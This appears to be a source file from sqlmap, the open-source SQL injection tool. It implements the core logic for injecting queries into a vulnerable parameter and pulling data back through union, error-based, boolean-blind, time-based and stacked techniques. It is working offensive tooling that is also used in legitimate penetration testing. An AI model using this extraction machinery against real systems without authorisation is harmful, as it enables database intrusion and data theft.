#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from lib.core.agent import agent
from lib.core.common import calculateDeltaSeconds
from lib.core.common import cleanQuery
from lib.core.common import dataToSessionFile
from lib.core.common import dataToStdout
from lib.core.common import expandAsteriskForColumns
from lib.core.common import getPublicTypeMembers
from lib.core.common import initTechnique
from lib.core.common import isTechniqueAvailable
from lib.core.common import parseUnionPage
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomInt
from lib.core.common import readInput
from lib.core.common import replaceNewlineTabs
from lib.core.common import safeStringFormat
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.exception import sqlmapNotVulnerableException
from lib.core.settings import MIN_TIME_RESPONSES
from lib.core.settings import MAX_TECHNIQUES_PER_VALUE
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.request.direct import direct
from lib.techniques.inband.union.use import unionUse
from lib.techniques.blind.inference import bisection
from lib.techniques.error.use import errorUse
from lib.utils.resume import queryOutputLength
from lib.utils.resume import resume

def __goInference(payload, expression, charsetType=None, firstChar=None, lastChar=None):
    start = time.time()

    if ( conf.eta or conf.threads > 1 ) and kb.dbms:
        _, length, _ = queryOutputLength(expression, payload)
    else:
        length = None

    dataToSessionFile("[%s][%s][%s][%s][" % (conf.url, kb.injection.place, conf.parameters[kb.injection.place], expression))

    count, value = bisection(payload, expression, length, charsetType, firstChar, lastChar)

    debugMsg = "performed %d queries in %d seconds" % (count, calculateDeltaSeconds(start))
    logger.debug(debugMsg)

    return value

def __goInferenceFields(expression, expressionFields, expressionFieldsList, payload, expected=None, num=None, resumeValue=True, charsetType=None, firstChar=None, lastChar=None):
    outputs     = []
    origExpr    = None

    for field in expressionFieldsList:
        output = None

        if field.startswith("ROWNUM "):
            continue

        if isinstance(num, int):
            origExpr   = expression
            expression = agent.limitQuery(num, expression, field)

        if "ROWNUM" in expressionFieldsList:
            expressionReplaced = expression
        else:
            expressionReplaced = expression.replace(expressionFields, field, 1)

        if resumeValue:
            output = resume(expressionReplaced, payload)

        if not output or ( expected == EXPECTED.INT and not output.isdigit() ):
            if output:
                warnMsg  = "expected value type %s, resumed '%s', " % (expected, output)
                warnMsg += "sqlmap is going to retrieve the value again"
                logger.warn(warnMsg)

            output = __goInference(payload, expressionReplaced, charsetType, firstChar, lastChar)

        if isinstance(num, int):
            expression = origExpr

        outputs.append(output)

    return outputs

def __goBooleanProxy(expression, resumeValue=True):
    """
    Retrieve the output of a boolean based SQL query
    """

    initTechnique(kb.technique)

    vector = kb.injection.data[kb.technique].vector
    vector = vector.replace("[INFERENCE]", expression)
    vector = agent.cleanupPayload(vector)
    query = agent.prefixQuery(vector)
    query = agent.suffixQuery(query)
    payload = agent.payload(newValue=query)
    timeBasedCompare = kb.technique in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)

    if resumeValue:
        output = resume(expression, payload)
    else:
        output = None

    if not output:
        output = Request.queryPage(payload, timeBasedCompare=timeBasedCompare, raise404=False)

    return output

def __goInferenceProxy(expression, fromUser=False, expected=None, batch=False, resumeValue=True, unpack=True, charsetType=None, firstChar=None, lastChar=None):
    """
    Retrieve the output of a SQL query characted by character taking
    advantage of an blind SQL injection vulnerability on the affected
    parameter through a bisection algorithm.
    """

    initTechnique(kb.technique)

    vector = agent.cleanupPayload(kb.injection.data[kb.technique].vector)
    query = agent.prefixQuery(vector)
    query = agent.suffixQuery(query)
    payload = agent.payload(newValue=query)
    count = None
    startLimit = 0
    stopLimit = None
    outputs = []
    test = None
    untilLimitChar = None
    untilOrderChar = None

    if resumeValue:
        output = resume(expression, payload)
    else:
        output = None

    if output and ( expected is None or ( expected == EXPECTED.INT and output.isdigit() ) ):
        return output

    if not unpack:
        return __goInference(payload, expression, charsetType, firstChar, lastChar)

    if kb.dbmsDetected:
        _, _, _, _, _, expressionFieldsList, expressionFields = agent.getFields(expression)

        rdbRegExp = re.search("RDB\$GET_CONTEXT\([^)]+\)", expression, re.I)
        if rdbRegExp and kb.dbms == DBMS.FIREBIRD:
            expressionFieldsList = [expressionFields]

        if len(expressionFieldsList) > 1:
            infoMsg = "the SQL query provided has more than a field. "
            infoMsg += "sqlmap will now unpack it into distinct queries "
            infoMsg += "to be able to retrieve the output even if we "
            infoMsg += "are going blind"
            logger.info(infoMsg)

        # If we have been here from SQL query/shell we have to check if
        # the SQL query might return multiple entries and in such case
        # forge the SQL limiting the query output one entry per time
        # NOTE: I assume that only queries that get data from a table
        # can return multiple entries
        if fromUser and " FROM " in expression:
            limitRegExp = re.search(queries[kb.dbms].limitregexp.query, expression, re.I)
            topLimit    = re.search("TOP\s+([\d]+)\s+", expression, re.I)

            if limitRegExp or ( kb.dbms in (DBMS.MSSQL, DBMS.SYBASE) and topLimit ):
                if kb.dbms in ( DBMS.MYSQL, DBMS.PGSQL ):
                    limitGroupStart = queries[kb.dbms].limitgroupstart.query
                    limitGroupStop  = queries[kb.dbms].limitgroupstop.query

                    if limitGroupStart.isdigit():
                        startLimit = int(limitRegExp.group(int(limitGroupStart)))

                    stopLimit = limitRegExp.group(int(limitGroupStop))
                    limitCond = int(stopLimit) > 1

                elif kb.dbms in (DBMS.MSSQL, DBMS.SYBASE):
                    if limitRegExp:
                        limitGroupStart = queries[kb.dbms].limitgroupstart.query
                        limitGroupStop  = queries[kb.dbms].limitgroupstop.query

                        if limitGroupStart.isdigit():
                            startLimit = int(limitRegExp.group(int(limitGroupStart)))

                        stopLimit = limitRegExp.group(int(limitGroupStop))
                        limitCond = int(stopLimit) > 1
                    elif topLimit:
                        startLimit = 0
                        stopLimit  = int(topLimit.group(1))
                        limitCond  = int(stopLimit) > 1

                elif kb.dbms == DBMS.ORACLE:
                    limitCond = False
            else:
                limitCond = True

            # I assume that only queries NOT containing a "LIMIT #, 1"
            # (or similar depending on the back-end DBMS) can return
            # multiple entries
            if limitCond:
                if limitRegExp:
                    stopLimit = int(stopLimit)

                    # From now on we need only the expression until the " LIMIT "
                    # (or similar, depending on the back-end DBMS) word
                    if kb.dbms in ( DBMS.MYSQL, DBMS.PGSQL ):
                        stopLimit += startLimit
                        untilLimitChar = expression.index(queries[kb.dbms].limitstring.query)
                        expression = expression[:untilLimitChar]

                    elif kb.dbms in (DBMS.MSSQL, DBMS.SYBASE):
                        stopLimit += startLimit

                if not stopLimit or stopLimit <= 1:
                    if kb.dbms == DBMS.ORACLE and expression.endswith("FROM DUAL"):
                        test = "n"
                    elif batch:
                        test = "y"
                    else:
                        message  = "can the SQL query provided return "
                        message += "multiple entries? [Y/n] "
                        test = readInput(message, default="Y")

                if not test or test[0] in ("y", "Y"):
                    # Count the number of SQL query entries output
                    countFirstField   = queries[kb.dbms].count.query % expressionFieldsList[0]
                    countedExpression = expression.replace(expressionFields, countFirstField, 1)

                    if re.search(" ORDER BY ", expression, re.I):
                        untilOrderChar = countedExpression.index(" ORDER BY ")
                        countedExpression = countedExpression[:untilOrderChar]

                    if resumeValue:
                        count = resume(countedExpression, payload)

                    if not stopLimit:
                        if not count or not count.isdigit():
                            count = __goInference(payload, countedExpression, charsetType, firstChar, lastChar)

                        if count and count.isdigit() and int(count) > 0:
                            count = int(count)

                            if batch:
                                stopLimit = count
                            else:
                                message  = "the SQL query provided can return "
                                message += "up to %d entries. How many " % count
                                message += "entries do you want to retrieve?\n"
                                message += "[a] All (default)\n[#] Specific number\n"
                                message += "[q] Quit"
                                test = readInput(message, default="a")

                                if not test or test[0] in ("a", "A"):
                                    stopLimit = count

                                elif test[0] in ("q", "Q"):
                                    return "Quit"

                                elif test.isdigit() and int(test) > 0 and int(test) <= count:
                                    stopLimit = int(test)

                                    infoMsg  = "sqlmap is now going to retrieve the "
                                    infoMsg += "first %d query output entries" % stopLimit
                                    logger.info(infoMsg)

                                elif test[0] in ("#", "s", "S"):
                                    message = "How many? "
                                    stopLimit = readInput(message, default="10")

                                    if not stopLimit.isdigit():
                                        errMsg = "Invalid choice"
                                        logger.error(errMsg)

                                        return None

                                    else:
                                        stopLimit = int(stopLimit)

                                else:
                                    errMsg = "Invalid choice"
                                    logger.error(errMsg)

                                    return None

                        elif count and not count.isdigit():
                            warnMsg  = "it was not possible to count the number "
                            warnMsg += "of entries for the SQL query provided. "
                            warnMsg += "sqlmap will assume that it returns only "
                            warnMsg += "one entry"
                            logger.warn(warnMsg)

                            stopLimit = 1

                        elif ( not count or int(count) == 0 ):
                            warnMsg  = "the SQL query provided does not "
                            warnMsg += "return any output"
                            logger.warn(warnMsg)

                            return None

                    elif ( not count or int(count) == 0 ) and ( not stopLimit or stopLimit == 0 ):
                        warnMsg  = "the SQL query provided does not "
                        warnMsg += "return any output"
                        logger.warn(warnMsg)

                        return None

                    for num in xrange(startLimit, stopLimit):
                        output = __goInferenceFields(expression, expressionFields, expressionFieldsList, payload, expected, num, resumeValue=resumeValue, charsetType=charsetType, firstChar=firstChar, lastChar=lastChar)
                        outputs.append(output)

                    return outputs

        elif kb.dbms == DBMS.ORACLE and expression.startswith("SELECT ") and " FROM " not in expression:
            expression = "%s FROM DUAL" % expression

        outputs = __goInferenceFields(expression, expressionFields, expressionFieldsList, payload, expected, resumeValue=resumeValue, charsetType=charsetType, firstChar=firstChar, lastChar=lastChar)

        returnValue = ", ".join([output for output in outputs])

    else:
        returnValue = __goInference(payload, expression, charsetType, firstChar, lastChar)

    return returnValue

def __goError(expression, resumeValue=True):
    """
    Retrieve the output of a SQL query taking advantage of an error-based
    SQL injection vulnerability on the affected parameter.
    """

    result = None

    if conf.direct:
        return direct(expression), None

    if resumeValue:
        result = resume(expression, None)

    if not result:
        result = errorUse(expression)
        dataToSessionFile("[%s][%s][%s][%s][%s]\n" % (conf.url, kb.injection.place, conf.parameters[kb.injection.place], expression, replaceNewlineTabs(result)))

    return result

def __goInband(expression, expected=None, sort=True, resumeValue=True, unpack=True, dump=False):
    """
    Retrieve the output of a SQL query taking advantage of an inband SQL
    injection vulnerability on the affected parameter.
    """

    output  = None
    partial = False
    data    = []

    if resumeValue:
        output = resume(expression, None)

        if not output or ( expected == EXPECTED.INT and not output.isdigit() ):
            partial = True

    if not output:
        output = unionUse(expression, resetCounter=True, unpack=unpack, dump=dump)

    if output:
        data = parseUnionPage(output, expression, partial, None, sort)

    return data

def getValue(expression, blind=True, inband=True, error=True, time=True, fromUser=False, expected=None, batch=False, unpack=True, sort=True, resumeValue=True, charsetType=None, firstChar=None, lastChar=None, dump=False, suppressOutput=False, expectingNone=False):
    """
    Called each time sqlmap inject a SQL query on the SQL injection
    affected parameter. It can call a function to retrieve the output
    through inband SQL injection (if selected) and/or blind SQL injection
    (if selected).
    """

    if suppressOutput:
        kb.disableStdOut = True

    try:
        if conf.direct:
            value = direct(expression)

        elif kb.unionTest or any(map(isTechniqueAvailable, getPublicTypeMembers(PAYLOAD.TECHNIQUE, onlyValues=True))):
            query = cleanQuery(expression)
            query = expandAsteriskForColumns(query)
            value = None
            found = False
            if query and not 'COUNT(*)' in query:
                query = query.replace("DISTINCT ", "")
            count = 0

            if expected == EXPECTED.BOOL:
                forgeCaseExpression = booleanExpression = expression

                if expression.upper().startswith("SELECT "):
                    booleanExpression = expression[len("SELECT "):]
                else:
                    forgeCaseExpression = agent.forgeCaseStatement(expression)

            if inband and kb.unionTest is not None:
                kb.technique = PAYLOAD.TECHNIQUE.UNION

                if expected == EXPECTED.BOOL:
                    value = __goInband(forgeCaseExpression, expected, sort, resumeValue, unpack, dump)
                else:
                    value = __goInband(query, expected, sort, resumeValue, unpack, dump)

                count += 1
                found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE

            oldUnionNegative = kb.unionNegative
            kb.unionNegative = False

            if error and isTechniqueAvailable(PAYLOAD.TECHNIQUE.ERROR) and not found:
                kb.technique = PAYLOAD.TECHNIQUE.ERROR

                if expected == EXPECTED.BOOL:
                    value = __goError(forgeCaseExpression, resumeValue)
                else:
                    value = __goError(query, resumeValue)

                count += 1
                found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE

            if blind and isTechniqueAvailable(PAYLOAD.TECHNIQUE.BOOLEAN) and not found:
                kb.technique = PAYLOAD.TECHNIQUE.BOOLEAN

                if expected == EXPECTED.BOOL:
                    value = __goBooleanProxy(booleanExpression, resumeValue)
                else:
                    value = __goInferenceProxy(query, fromUser, expected, batch, resumeValue, unpack, charsetType, firstChar, lastChar)

                count += 1
                found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE

            if time and (isTechniqueAvailable(PAYLOAD.TECHNIQUE.TIME) or isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED)) and not found:
                if isTechniqueAvailable(PAYLOAD.TECHNIQUE.TIME):
                    kb.technique = PAYLOAD.TECHNIQUE.TIME
                else:
                    kb.technique = PAYLOAD.TECHNIQUE.STACKED

                if expected == EXPECTED.BOOL:
                    value = __goBooleanProxy(booleanExpression, resumeValue)
                else:
                    value = __goInferenceProxy(query, fromUser, expected, batch, resumeValue, unpack, charsetType, firstChar, lastChar)

            kb.unionNegative = oldUnionNegative

            if value and isinstance(value, basestring):
                value = value.strip()
        else:
            errMsg = "none of the injection types identified can be "
            errMsg += "leveraged to retrieve queries output"
            raise sqlmapNotVulnerableException, errMsg

    finally:
        if suppressOutput:
            kb.disableStdOut = False

    if value and expected == EXPECTED.BOOL:
        if isinstance(value, basestring):
            if value.lower() in ("true", "false"):
                value = bool(value)
            elif value.capitalize() == "None":
                value = None
            else:
                value = value != "0"
        elif isinstance(value, int):
            value = bool(value)

    return value

def goStacked(expression, silent=False):
    kb.technique = PAYLOAD.TECHNIQUE.STACKED
    expression = cleanQuery(expression)

    if conf.direct:
        return direct(expression), None

    comment = queries[kb.dbms].comment.query
    query = agent.prefixQuery("; %s" % expression)
    query = agent.suffixQuery("%s;%s" % (query, comment))

    debugMsg = "query: %s" % query
    logger.debug(debugMsg)

    payload = agent.payload(newValue=query)
    page, _ = Request.queryPage(payload, content=True, silent=silent, noteResponseTime=False)

    return payload, page

def checkBooleanExpression(expression, expectingNone=True):
    return getValue(unescaper.unescape(expression), expected=EXPECTED.BOOL, suppressOutput=True, expectingNone=expectingNone)
